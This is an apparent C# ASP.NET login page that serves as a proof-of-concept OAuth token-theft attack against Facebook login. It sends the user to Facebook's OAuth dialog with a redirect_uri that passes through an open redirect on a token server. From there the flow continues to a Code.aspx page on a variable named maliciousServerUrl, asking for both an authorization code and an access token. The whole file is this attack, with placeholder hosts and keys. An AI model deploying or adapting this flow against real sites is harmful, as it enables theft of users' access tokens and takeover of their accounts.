using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace TokenSiteWebForm
{
    public partial class Login : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            string tokenServerUrl = "http://localhost:5999"; // configure for yourself environment.
            string maliciousServerUrl = "http://localhost:6003"; // configure for yourself environment.
            string key = "[YOUR_FB_APP_KEY]"; // configure for yourself environment.
            string scope = "[FB_SCOPE]"; // configure for yourself environment.
            string redirectUrl = HttpUtility.UrlEncode(
                string.Format("{0}/Redirect.aspx?redirectUrl={1}", tokenServerUrl, 
                HttpUtility.UrlEncode(string.Format("{0}/Code.aspx", maliciousServerUrl))));

            Response.Redirect(string.Format(
                "https://www.facebook.com/dialog/oauth?client_id={0}&redirect_uri={1}&response_type=code%20token&scope={2}",
                key, redirectUrl, scope));
        }
    }
}